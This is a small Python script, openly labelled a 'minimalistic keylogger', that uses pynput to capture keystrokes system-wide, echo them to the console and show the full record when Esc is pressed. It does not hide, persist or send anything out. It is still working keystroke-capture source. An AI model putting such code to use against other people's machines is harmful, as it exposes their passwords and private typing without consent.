from pynput import keyboard
import os

keys_pressed = []
class quit_exception(Exception):
    pass

def on_press(key):
    global keys_pressed
    if key == keyboard.Key.shift:
        return
    elif key == keyboard.Key.esc:
        raise quit_exception(key)
    else:
        keys_pressed.append(str(key).replace("'", "").replace("Key.", ""))
        print(str(key).replace("'", "").replace("Key.", ""))


def logger():
    global keys_pressed
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except:
            os.system('cls' if os.name == 'nt' else 'clear')            
            print("\n", *keys_pressed, sep=" ")
            input("\n Press Enter to resume.\n ")
            os.system('cls' if os.name == 'nt' else 'clear')            


if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""  _              _                   _     _ 
 | |            | |                 ( )   | |
 | | _____ _   _| | ___   __ _  __ _|/  __| |
 | |/ / _ \ | | | |/ _ \ / _` |/ _` |  / _` |
 |   <  __/ |_| | | (_) | (_| | (_| | | (_| |
 |_|\_\___|\__, |_|\___/ \__, |\__, |  \__,_|
            __/ |         __/ | __/ |        
           |___/         |___/ |___/         
 \nMinimalistic Python keylogger - Press Enter to start. - Press Esc to show results""")
    input()
    os.system('cls' if os.name == 'nt' else 'clear')
    while True:
        logger()
